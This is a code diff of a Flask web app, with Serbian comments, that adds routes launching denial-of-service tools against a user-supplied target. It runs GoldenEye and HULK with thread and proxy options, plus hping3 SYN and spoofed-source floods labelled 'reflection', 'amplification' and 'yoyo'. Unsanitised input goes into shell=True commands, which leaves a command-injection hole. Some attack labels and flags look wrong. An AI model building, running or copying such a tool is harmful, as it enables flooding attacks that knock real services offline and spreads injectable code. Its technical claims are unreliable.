@@ -1,5 +1,6 @@
 import subprocess
 from flask import Flask, render_template, request, jsonify, redirect, url_for
+import time 
 
 app = Flask(__name__)
 
@@ -277,34 +278,121 @@ def run_tool():
 def ddos_home():
     return render_template('ddos_tools.html')
 
-@app.route('/start_ddos', methods=['POST'])
-def start_ddos():
+@app.route('/goldeneye')
+def goldeneye():
+    return render_template('goldenEye.html')
+
+@app.route('/hulk')
+def hulk():
+    return render_template('hulk.html')
+
+# Pokretanje GoldenEye sa dodatnim opcijama
+@app.route('/run_goldeneye', methods=['POST'])
+def run_goldeneye():
     data = request.get_json()
     target = data.get('target')
-    method = data.get('method')
-    requests = data.get('requests')
+    threads = data.get('threads')
+    proxy = data.get('proxy')  # Proxy opcija
+    timeout = data.get('timeout')  # Timeout opcija
+    keep_alive = data.get('keep_alive', False)  # Keep-Alive opcija
 
-    if not target or not method or not requests:
-        return jsonify({"error": "Invalid input"}), 400
+    if not target or not threads:
+        return jsonify({"error": "Nedostaju parametri"}), 400
 
-    # Map methods to commands
-    command_map = {
-        "http-flood": f"curl -X GET {target} -m 10 -s -o /dev/null",
-        "syn-flood": f"hping3 -S {target} -p 80 -c {requests}",
-        "udp-flood": f"hping3 --udp {target} -p 80 -c {requests}"
-    }
-
-    command = command_map.get(method)
-    if not command:
-        return jsonify({"error": "Invalid attack method"}), 400
+    # Komanda za GoldenEye
+    command = f"python3 goldeneye.py {target} -w {threads}"
+    if proxy:
+        command += f" --proxy {proxy}"
+    if timeout:
+        command += f" --timeout {timeout}"
+    if keep_alive:
+        command += " --keep-alive"
 
     try:
         result = subprocess.run(command, shell=True, text=True, capture_output=True)
         output = result.stdout or result.stderr
     except Exception as e:
-        output = f"Error: {str(e)}"
+        output = f"Greška: {str(e)}"
 
     return jsonify({"output": output})
+
+# Pokretanje HULK sa dodatnim opcijama
+@app.route('/run_hulk', methods=['POST'])
+def run_hulk():
+    data = request.get_json()
+    target = data.get('target')
+    randomize = data.get('randomize', False)  # Randomizacija opcija
+
+    if not target:
+        return jsonify({"error": "Nedostaju parametri"}), 400
+
+    # Komanda za HULK
+    command = f"python3 hulk.py {target}"
+    if randomize:
+        command += " --randomize"
+
+    try:
+        result = subprocess.run(command, shell=True, text=True, capture_output=True)
+        output = result.stdout or result.stderr
+    except Exception as e:
+        output = f"Greška: {str(e)}"
+
+    return jsonify({"output": output})
+@app.route('/other_tools')
+def other_tools():
+    return render_template('other_tools.html')
+
+# Ruta za pokretanje drugih napada
+@app.route('/run_others_attack', methods=['POST'])
+
+
+def run_others_attack():
+    data = request.get_json()
+    ip_address = data.get('ipAddress')
+    attack_type = data.get('attackType')
+
+    if not ip_address or not attack_type:
+        return jsonify({"error": "Nedostaju parametri"}), 400
+
+    command = ""
+    if attack_type == "syn":
+        command = f"sudo hping3 -S {ip_address} -p 80 --flood -c 1000"  # Ograničenje na 1000 paketa za primer
+    elif attack_type == "reflection":
+        command = f"sudo hping3 --flood --spoof {ip_address} -p 80 -c 1000"
+    elif attack_type == "amplification":
+        command = f"sudo hping3 --flood --spoof {ip_address} -p 80 --udp -c 1000"
+    elif attack_type == "yoyo":
+        command = f"sudo hping3 --flood --spoof {ip_address} -p 80 --yoyo -c 1000"
+    else:
+        return jsonify({"error": "Nepoznata vrsta napada"}), 400
+
+    try:
+        # Beleženje početka vremena napada
+        start_time = time.time()
+
+        # Pokrećemo napad
+        result = subprocess.run(command, shell=True, text=True, capture_output=True)
+        
+        # Beleženje kraja vremena napada
+        end_time = time.time()
+
+        # Obrada rezultata
+        output = result.stdout or result.stderr
+        elapsed_time = end_time - start_time  # Trajanje napada
+        packets_sent = 1000  # Prema parametru -c, broj poslatih paketa
+
+        # Povratni podaci
+        return jsonify({
+            "success": True,
+            "ip_address": ip_address,
+            "attack_type": attack_type,
+            "packets_sent": packets_sent,
+            "elapsed_time": round(elapsed_time, 2),  # Trajanje u sekundama
+            "output": output
+        })
+    except Exception as e:
+        return jsonify({"success": False, "error": f"Greška: {str(e)}"}), 500
+
 
 @app.route('/social_engineering')
 def social_engineering_page():
